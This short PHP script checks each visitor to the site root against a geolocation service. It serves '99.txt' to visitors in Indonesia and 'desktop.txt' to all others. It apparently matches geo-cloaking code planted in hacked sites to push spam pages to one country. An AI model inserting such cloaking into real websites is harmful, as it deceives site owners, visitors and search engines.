<?php
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$uri = $_SERVER['REQUEST_URI'] ?? '';

if ($uri == '/') {
    $locationData = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country"), true);

    $isIndonesia = ($locationData['status'] === 'success' && 
                    strtolower($locationData['country']) === 'indonesia');

    if ($isIndonesia) {
        echo file_get_contents('99.txt');
    } else {
        echo file_get_contents('desktop.txt');
    }

    exit();
}
?>
